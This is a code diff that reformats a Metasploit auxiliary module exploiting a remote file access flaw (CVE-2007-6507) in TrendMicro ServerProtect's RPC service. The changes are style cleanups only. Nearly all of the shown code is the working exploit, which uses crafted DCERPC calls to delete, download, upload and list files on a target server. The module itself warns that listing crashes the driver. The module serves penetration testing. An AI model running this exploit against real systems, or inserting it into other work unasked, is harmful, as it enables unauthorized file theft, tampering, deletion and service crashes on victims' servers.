@@ -1,67 +1,65 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::DCERPC
   include Msf::Post::Windows::Registry
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'TrendMicro ServerProtect File Access',
-      'Description'    => %q{
-        This modules exploits a remote file access flaw in the ServerProtect Windows
-      Server RPC service. Please see the action list (or the help output) for more
-      information.
-      },
-      'DefaultOptions' =>
-        {
-          'DCERPC::ReadTimeout' => 300 # Long-running RPC calls
-        },
-      'Author'         => [ 'toto' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'CVE', '2007-6507' ],
-          [ 'OSVDB', '44318' ],
-          [ 'ZDI', '07-077'],
-        ],
-      'Actions'        =>
-        [
-          [ 'delete'   ],
-          [ 'download' ],
-          [ 'upload'   ],
-          [ 'list'     ]
-        ]
-      ))
+                      'Name'           => 'TrendMicro ServerProtect File Access',
+                      'Description'    => %q{
+                        This modules exploits a remote file access flaw in the ServerProtect Windows
+                      Server RPC service. Please see the action list (or the help output) for more
+                      information.
+                      },
+                      'DefaultOptions' =>
+                        {
+                          'DCERPC::ReadTimeout' => 300 # Long-running RPC calls
+                        },
+                      'Author'         => [ 'toto' ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'CVE', '2007-6507' ],
+                          [ 'OSVDB', '44318' ],
+                          [ 'ZDI', '07-077']
+                        ],
+                      'Actions'        =>
+                        [
+                          [ 'delete'   ],
+                          [ 'download' ],
+                          [ 'upload'   ],
+                          [ 'list'     ]
+                        ]))
 
     register_options(
       [
         Opt::RPORT(5168),
         OptString.new('RPATH',
-          [
-            false,
-            "The remote filesystem path",
-            nil
-          ]),
+                      [
+                        false,
+                        "The remote filesystem path",
+                        nil
+                      ]),
         OptString.new('LPATH',
-          [
-            false,
-            "The local filesystem path",
-            nil
-          ]),
-      ], self.class)
+                      [
+                        false,
+                        "The local filesystem path",
+                        nil
+                      ])
+      ], self.class
+    )
   end
 
   def check_option(name)
-    if(not datastore[name])
-      raise RuntimeError, "The #{name} parameter is required by this option"
+    unless datastore[name]
+      raise "The #{name} parameter is required by this option"
     end
   end
 
@@ -70,7 +68,7 @@ class MetasploitModule < Msf::Auxiliary
       "delete" => "Delete a file",
       "download" => "Download a file",
       "upload" => "Upload a file",
-      "list" => "List files (not recommended - will crash the driver)",
+      "list" => "List files (not recommended - will crash the driver)"
     }
   end
 
@@ -96,15 +94,14 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def deunicode(str)
-    str.gsub(/\x00/, '').strip
+    str.delete("\u0000").strip
   end
 
   #
   # Once this function is used, if cmd_download or cmd_upload is called the server will crash :/
   #
   def cmd_list(*args)
-
-    if (args.length < 1)
+    if args.empty?
       print_status("Usage: list folder")
       return
     end
@@ -116,42 +113,39 @@ class MetasploitModule < Msf::Auxiliary
 
     # FindFirstFile
     resp = serverprotect_rpccmd(131080, data, 0x100)
-    return if not resp
+    return unless resp
 
     if resp.length != 0x108
       print_error("An unknown error occurred while calling FindFirstFile.")
       return
     end
 
-
-    ret, = resp[0x104,4].unpack('V')
+    ret, = resp[0x104, 4].unpack('V')
     if ret != 0
       print_error("An error occurred while calling FindFirstFile #{args[0]}: #{ret}.")
       return
     end
 
-    handle, = resp[4,4].unpack('V')
+    handle, = resp[4, 4].unpack('V')
 
     file = deunicode(resp[0x30, 0xd0])
     print("#{file}\n")
 
     data = "\0" * 0x100
-    data[0,4] = [handle].pack('V')
+    data[0, 4] = [handle].pack('V')
 
-    while true
+    loop do
       # FindNextFile
       resp = serverprotect_rpccmd(131081, data, 0x100)
-      return if not resp
+      return unless resp
 
       if resp.length != 0x108
         print_error("An unknown error occurred while calling FindFirstFile.")
         break
       end
 
-      ret, = resp[0x104,4].unpack('V')
-      if ret != 0
-        break
-      end
+      ret, = resp[0x104, 4].unpack('V')
+      break if ret != 0
 
       file = deunicode(resp[0x30, 0xd0])
       print("#{file}\n")
@@ -163,20 +157,18 @@ class MetasploitModule < Msf::Auxiliary
     resp = serverprotect_rpccmd(131082, data, 0x100)
   end
 
-
   def cmd_delete(*args)
-
-    if (args.length == 0)
+    if args.empty?
       print_status("Usage: delete c:\\windows\\system.ini")
       return
     end
 
-    data = Rex::Text.to_unicode(args[0]+"\0")
+    data = Rex::Text.to_unicode(args[0] + "\0")
     resp = serverprotect_rpccmd(131077, data, 4)
-    return if not resp
+    return unless resp
 
-    if (resp.length == 12)
-      ret, = resp[8,4].unpack('V')
+    if resp.length == 12
+      ret, = resp[8, 4].unpack('V')
 
       if ret == 0
         print_status("File #{args[0]} successfully deleted.")
@@ -184,13 +176,10 @@ class MetasploitModule < Msf::Auxiliary
         print_error("An error occurred while deleting #{args[0]}: #{ret}.")
       end
     end
-
   end
 
-
   def cmd_download(*args)
-
-    if (args.length < 2)
+    if args.length < 2
       print_status("Usage: download remote_file local_file")
       return
     end
@@ -200,16 +189,14 @@ class MetasploitModule < Msf::Auxiliary
     # OPEN_EXISTING: 3
     # FILE_ATTRIBUTE_NORMAL: 0x80
     handle = serverprotect_createfile(args[0], 0x80000000, 1, 3, 0x80)
-    if (not handle or handle == 0)
-      return
-    end
+    return if !handle || (handle == 0)
 
     fd = File.new(args[1], "wb")
 
     print_status("Downloading #{args[0]}...")
 
     # reads 0x1000 bytes (hardcoded in the soft)
-    while ((data = serverprotect_readfile(handle)).length > 0)
+    until (data = serverprotect_readfile(handle)).empty?
       fd.write(data)
     end
 
@@ -220,10 +207,8 @@ class MetasploitModule < Msf::Auxiliary
     print_status("File #{args[0]} successfully downloaded.")
   end
 
-
   def cmd_upload(*args)
-
-    if (args.length < 2)
+    if args.length < 2
       print_status("Usage: upload local_file remote_file")
       return
     end
@@ -233,16 +218,14 @@ class MetasploitModule < Msf::Auxiliary
     # CREATE_ALWAYS: 2
     # FILE_ATTRIBUTE_NORMAL: 0x80
     handle = serverprotect_createfile(args[1], 0x40000000, 2, 2, 0x80)
-    if (handle == 0)
-      return
-    end
+    return if handle == 0
 
     fd = File.new(args[0], "rb")
 
     print_status("Uploading #{args[1]}...")
 
     # write 0x1000 bytes (hardcoded in the soft)
-    while ((data = fd.read(0x1000)) != nil)
+    while (data = fd.read(0x1000)) != nil
       serverprotect_writefile(handle, data)
     end
 
@@ -253,7 +236,6 @@ class MetasploitModule < Msf::Auxiliary
     print_status("File #{args[1]} successfully uploaded.")
   end
 
-
   def serverprotect_createfile(file, desiredaccess, sharemode, creationdisposition, flags)
     data = "\0" * 540
     file = Rex::Text.to_unicode(file)
@@ -261,14 +243,14 @@ class MetasploitModule < Msf::Auxiliary
     data[524, 16] = [desiredaccess, sharemode, creationdisposition, flags].pack('VVVV')
 
     resp = serverprotect_rpccmd(131073, data, 540)
-    return if not resp
+    return unless resp
 
-    if (resp.length < 548)
+    if resp.length < 548
       print_error("An unknown error occurred while calling CreateFile.")
       return 0
     else
-      handle, = resp[4,4].unpack('V')
-      ret, = resp[544,4].unpack('V')
+      handle, = resp[4, 4].unpack('V')
+      ret, = resp[544, 4].unpack('V')
 
       if ret != 0
         print_error("An error occurred while calling CreateFile: #{ret}.")
@@ -279,19 +261,18 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
   def serverprotect_readfile(handle)
     data = "\0" * 4104
     data[0, 4] = [handle].pack('V')
 
     resp = serverprotect_rpccmd(131075, data, 4104)
-    return if not resp
+    return unless resp
 
-    if (resp.length != 4112)
+    if resp.length != 4112
       print_error("An unknown error occurred while calling ReadFile.")
       return ''
     else
-      ret, = resp[4108,4].unpack('V')
+      ret, = resp[4108, 4].unpack('V')
 
       if ret != 0
         print_error("An error occurred while calling CreateFile: #{ret}.")
@@ -303,7 +284,6 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
   def serverprotect_writefile(handle, buf)
     data = "\0" * 4104
     data[0, 4] = [handle].pack('V')
@@ -311,13 +291,13 @@ class MetasploitModule < Msf::Auxiliary
     data[4100, 4] = [buf.length].pack('V')
 
     resp = serverprotect_rpccmd(131076, data, 4104)
-    return if not resp
+    return unless resp
 
-    if (resp.length != 4112)
+    if resp.length != 4112
       print_error("An unknown error occurred while calling WriteFile.")
       return 0
     else
-      ret, = resp[4108,4].unpack('V')
+      ret, = resp[4108, 4].unpack('V')
 
       if ret != 0
         print_error("An error occurred while calling WriteFile: #{ret}.")
@@ -325,20 +305,19 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    return 1
+    1
   end
-
 
   def serverprotect_closehandle(handle)
     data = [handle].pack('V')
 
     resp = serverprotect_rpccmd(131074, data, 4)
-    return if not resp
+    return unless resp
 
-    if (resp.length != 12)
+    if resp.length != 12
       print_error("An unknown error occurred while calling CloseHandle.")
     else
-      ret, = resp[8,4].unpack('V')
+      ret, = resp[8, 4].unpack('V')
 
       if ret != 0
         print_error("An error occurred while calling CloseHandle: #{ret}.")
@@ -346,13 +325,12 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
   def serverprotect_rpccmd(cmd, data, osize)
-    if (data.length.remainder(4) != 0)
-      padding = "\0" * (4 - (data.length.remainder(4)))
-    else
-      padding = ""
-    end
+    padding = if data.length.remainder(4) != 0
+                "\0" * (4 - data.length.remainder(4))
+              else
+                ""
+              end
 
     stub =
       NDR.long(cmd) +
@@ -362,14 +340,13 @@ class MetasploitModule < Msf::Auxiliary
       NDR.long(data.length) +
       NDR.long(osize)
 
-    return serverprotect_rpc_call(0, stub)
+    serverprotect_rpc_call(0, stub)
   end
 
   #
   # Call the serverprotect RPC service
   #
   def serverprotect_rpc_call(opnum, data = '')
-
     begin
 
       connect
@@ -384,7 +361,7 @@ class MetasploitModule < Msf::Auxiliary
       resp = dcerpc.call(opnum, data)
       outp = ''
 
-      if (dcerpc.last_response and dcerpc.last_response.stub_data)
+      if dcerpc.last_response && dcerpc.last_response.stub_data
         outp = dcerpc.last_response.stub_data
       end
 
@@ -393,11 +370,10 @@ class MetasploitModule < Msf::Auxiliary
       outp
 
     rescue ::Interrupt
-      raise $!
+      raise $ERROR_INFO
     rescue ::Exception => e
       print_error("Error: #{e}")
       nil
     end
   end
-
 end
